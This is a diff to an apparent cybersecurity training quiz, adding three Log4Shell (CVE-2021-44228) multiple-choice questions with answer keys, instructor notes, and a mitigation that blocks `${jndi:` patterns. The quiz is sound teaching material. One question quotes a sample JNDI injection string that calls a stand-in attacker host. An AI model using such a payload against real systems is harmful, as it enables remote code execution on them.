@@ -34,7 +34,7 @@
 | Week 1 | M1–M2 | Q1–Q30 | 25 min |
 | Week 2 | M3–M4 | Q31–Q60 | 25 min |
 | Week 3 | M5–M6 | Q61–Q90 | 25 min |
-| Week 4 | M7–M8 | Q91–Q120 | 25 min |
+| Week 4 | M7–M8 | Q91–Q120 + Q105-B/Q106-B/Q107-B (Log4Shell bonus) | 30 min |
 | Week 5 | M9–M10 | Q121–Q150 | 25 min |
 | Week 6 | M11–M12 | Q151–Q180 | 25 min |
 | Final Review | M1–M12 | Top 30 (curated) | 30 min |
@@ -1333,6 +1333,47 @@
 
 *Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★
 *Instructor Note:* Classic BOLA/IDOR in a Nigerian fintech API. Debrief: This exact vulnerability pattern has appeared in real Nigerian fintech breaches. Fix = server must verify that the requesting user OWNS the resource being accessed, on every single request.
+
+---
+
+### MODULE 7 BONUS — Log4Shell Questions (Q105-B through Q107-B)
+*Use these as extension questions for advanced cohorts or as a dedicated Log4Shell deep-dive segment.*
+
+---
+
+**Q105-B**
+**Log4Shell (CVE-2021-44228) is classified as which OWASP Top 10 category?**
+- A) A03: Injection
+- B) A05: Security Misconfiguration
+- C) **A06: Vulnerable and Outdated Components** ✓
+- D) A08: Software and Data Integrity Failures
+
+*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000
+*Instructor Note:* Key teaching — Log4Shell is not a code the developers wrote; it is a dependency they included. A06 = you are responsible for ALL code your application runs, including third-party libraries.
+
+---
+
+**Q106-B**
+**The Log4Shell exploit works by inserting a string like `${jndi:ldap://attacker.com/exploit}` into a field that gets logged. What does the vulnerable server do when it processes this string?**
+- A) Displays the attacker's text verbatim in an error message
+- B) Blocks the request and logs a security warning
+- C) **Makes an outbound network request to the attacker's server and executes the returned code** ✓
+- D) Crashes the logging service with a denial-of-service
+
+*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000
+*Instructor Note:* JNDI (Java Naming and Directory Interface) lookup — Log4j interprets the `${jndi:...}` syntax as a lookup and executes it. The server phones home to the attacker. This is unauthenticated Remote Code Execution in a logging call. CVSS 10.0 = maximum.
+
+---
+
+**Q107-B** ★ DOUBLE POINTS
+**A security team discovers their Java enterprise application is using Log4j 2.14.1. Exploitation attempts matching the Log4Shell pattern are visible in their web logs. They have 2 hours before business opens. In order of priority, what should they do FIRST?**
+- A) Rebuild the entire application from scratch on a non-Java stack
+- B) Block all inbound internet traffic with a firewall rule until the situation is assessed
+- C) **Apply the Log4j patch (upgrade to 2.17.1+) on all affected services immediately, or if patching is impossible, apply WAF rules blocking `${jndi:` patterns as a temporary mitigation** ✓
+- D) Submit a NDPA breach notification immediately — the vulnerability means a breach has already occurred
+
+*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★
+*Instructor Note:* Debrief carefully — option D is wrong because a vulnerability is not yet a breach (no confirmed data exfiltration). Option B is partial mitigation. Correct answer = patch first (C), then assess for compromise and trigger breach notification only if evidence of data exfiltration exists.
 
 ---
 
